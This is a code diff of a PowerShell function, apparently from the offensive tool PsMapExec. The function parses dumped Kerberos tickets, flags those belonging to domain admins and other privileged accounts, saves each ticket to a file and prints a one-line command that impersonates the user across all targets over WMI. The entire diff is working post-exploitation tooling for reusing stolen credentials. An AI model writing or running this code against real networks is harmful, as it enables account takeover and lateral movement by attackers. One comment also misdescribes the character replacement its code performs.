@@ -4421,24 +4421,28 @@ function AdminCount {
 }
 
 function Parse-KerbDump {
-
     Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
-    Start-Sleep -Seconds 1
+    Start-sleep -Seconds "2"
 
     # Initialize DirectorySearcher
     $Searcher = New-Object System.DirectoryServices.DirectorySearcher
     $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")
 
+    # Grab each candidate file for parsing based on the name ending in "KerbDump.txt"
     Get-ChildItem -Path $KerbDump -Filter "*KerbDump.txt" | 
         Where-Object { $_.Length -gt 0 } | 
         ForEach-Object {
             $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
+            
+            # Create the following flag to track output later
+            $DisplayComputerName = $True
 
-            Write-Host "`n`n-[$Computer]-`n"
+            # Create a directory in the name of the computer from which results are parsed from
             New-Item -ItemType "Directory" -Path $KerbDump -Name $Computer -Force | Out-Null
             $ComputerDirectory = "$KerbDump\$Computer"
 
-            $fileContent = Get-Content -Path $_.FullName -Raw
+            # Read the file content
+            $FileContent = Get-Content -Path $_.FullName -Raw
 
             # Define regex pattern to match ticket details
             $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"
@@ -4456,48 +4460,77 @@ function Parse-KerbDump {
                     SessionKeyType  = $match.Groups[7].Value
                 }
 
+                # Transform the username into a more common format "DOMAIN\Username"
                 $userNameParts = $data.UserName -split '@'
                 $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
-                $actualUserName = $userNameParts[0]
+                $DomainUserName = $userNameParts[0]
 
-                # Initialize notes
+                # If the name contains $ then drop results from current loop. We do not want to see Computer account tickets in results
+                if ($DomainUserName -match '\$$') { Continue }
+
+                # Initialize notes variable
                 $notes = ""
 
-                # Check AdminCount
-                if (AdminCount -UserName $actualUserName -Searcher $Searcher) {
+                # Track if the user is considered "Privileged". Used to help maintain tidy output by omitting some flags if present
+                $PrivilegedUser = $false  
+
+                if ($DomainUserName -in $DomainAdmins) { 
+                    $notes += "[Domain Admin] " 
+                    $PrivilegedUser = $true
+                }
+                if ($DomainUserName -in $EnterpriseAdmins) { 
+                    $notes += "[Enterprise Admin] " 
+                    $PrivilegedUser = $true
+                }
+                if ($DomainUserName -in $ServerOperators) { 
+                    $notes += "[Server Operator] " 
+                    $PrivilegedUser = $true
+                }
+                if ($DomainUserName -in $AccountOperators) { 
+                    $notes += "[Account Operator] " 
+                    $PrivilegedUser = $true
+                }
+
+                # Check AdminCount only if the user is not already identified as $PrivilegedUser
+                if (-not $PrivilegedUser -and (AdminCount -UserName $DomainUserName -Searcher $Searcher)) {
                     $notes += "[AdminCount=1] "
                 }
 
-                # Check for other tags
+                # if a KRBTGT service is contained within the field, add the tag [TGT] to the results
                 if ($data.ServiceName -match "krbtgt/") {
                     $notes += "[TGT] "
                 }
-                if ($actualUserName -in $DomainAdmins) { $notes += "[Domain Admin] " }
-                if ($actualUserName -in $EnterpriseAdmins) { $notes += "[Enterprise Admin] " }
-                if ($actualUserName -in $ServerOperators) { $notes += "[Server Operator] " }
-                if ($actualUserName -in $AccountOperators) { $notes += "[Account Operator] " }
 
-                # Only display blocks of data if a tag will be present
+                # Only present results if the note field has been populated. This means interesting results have been identified.
                 if ($notes -ne "") {
-                    Write-Host "User Name     : $($domainName.ToUpper())\$($actualUserName)"
+                    if ($DisplayComputerName) {
+                        Write-Host "`n`n-[$Computer]-`n"
+                        $DisplayComputerName = $false
+                    }
+                    
+                    Write-Host "User Name     : $($domainName.ToUpper())\$($DomainUserName)"
                     Write-Host "Service Name  : $($data.ServiceName)"
                     Write-Host "Server Name   : $($data.ServerName)"
                     Write-Host "Ticket Expiry : $($data.TicketExp)"
                     Write-Host -NoNewline "Notes         : "
                     Write-Host -ForegroundColor Yellow -NoNewline "$notes"
                     Write-Host
+
+                    # Logic to help pull just the ticket string
                     $ticketPattern = "-\[Ticket\]-`r?`n`r?`n(.+?)(?:`r?`n|$)"
                     $ticketStartPos = $match.Index + $match.Length
                     $ticketSearchText = $fileContent.Substring($ticketStartPos)
                     if ($ticketSearchText -match $ticketPattern) {
                         $ticketString = $Matches[1]
                         
-                        # Replace '\' with '_' in ServiceName
+                        # Replace '\' with '_' in ServiceName, Windows will not accept "/" as part of a file name
                         $data.ServiceName = $data.ServiceName.Replace('/', '@')
                         
+                        # Form a path and file name made up of the ticket properties
                         $filePath = "$ComputerDirectory\$($data.UserName)-$($data.ServiceName).txt"
                         $ticketString | Out-File -FilePath $filePath -NoNewline -Encoding "ASCII"
                         
+                        # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                         do {
                             $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
                         } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)
@@ -4505,7 +4538,7 @@ function Parse-KerbDump {
                         Set-Variable -Name $randomVarName -Value $filePath -Scope Global
                         
                         # A neat one-liner instruction for the user
-                        Write-Host "Impersonate   : PsMapExec -Targets All -Method WMI -Ticket `$$randomVarName" -ForegroundColor "Red"
+                        Write-Host "Impersonate   : PsMapExec -Targets All -Method WMI -Ticket `$$randomVarName"
                         Write-Host
                     }
                 }
@@ -4515,10 +4548,12 @@ function Parse-KerbDump {
             $newFileName = ".$Computer.FullDump.txt"
             Move-Item -Path $_.FullName -Destination "$ComputerDirectory\$newFileName" -Force
         }
+
+    Write-Host "`n`n[*] " -NoNewline -ForegroundColor "Yellow"
+    Write-Host "Only interesting results have  been shown. Computer accounts are omitted"
+    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+    Write-Host "Run with -NoParse to prevent parsing results in the future"
 }
-
-
-
 
 
 
